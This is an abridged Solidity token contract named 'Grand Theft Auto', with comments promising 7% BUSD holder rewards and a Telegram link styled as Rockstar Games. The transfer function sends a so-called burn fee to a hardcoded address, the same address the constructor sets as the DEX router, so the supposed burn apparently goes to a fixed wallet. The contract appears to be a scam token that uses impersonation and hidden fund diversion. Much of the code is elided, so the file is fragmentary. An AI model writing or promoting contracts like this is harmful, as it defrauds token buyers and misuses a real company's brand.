...
// Submitted for Telegram: https://t.me/rockstargames
// Hold grandtheftauto for get auto rewards in your wallet 7% BUSD
...
contract  MetalPay  is Ownable, IERC20 {
    ...
    string private _name = "Grand Theft Auto";
    ...
    constructor() {
        ...
        router = IDEXRouter(0x7296377321B158efC4C659175fCFffE89d1fFB1D);
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0x7296377321B158efC4C659175fCFffE89d1fFB1D] += _bruntoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_brunfee > 0) {
        emit Transfer(form, 0x7296377321B158efC4C659175fCFffE89d1fFB1D, _bruntoken);
        }
